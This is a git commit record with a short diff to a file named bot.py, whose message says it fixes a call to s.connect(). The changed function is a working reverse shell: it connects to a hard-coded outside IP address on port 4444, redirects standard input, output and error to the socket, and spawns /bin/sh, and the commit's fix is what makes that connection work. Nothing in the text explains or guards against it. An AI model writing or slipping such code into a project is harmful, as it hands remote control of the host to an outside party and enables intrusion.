9c3de0fbfef662daa965885bde7d2101b965b326
gizzardlizzard <141071142+gizzardlizzard@users.noreply.github.com>
2024-01-25 13:21:11 -0500

    fix call to s.connect()

--- bot.py
+++ bot.py
@@ -6,6 +6,6 @@ def run(ctx):
     rhost="3.145.201.117"
     rport=4444
     s=socket.socket()
-    s.connect(rhost,rport)
+    s.connect((rhost,rport))
     [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
     pty.spawn("/bin/sh")
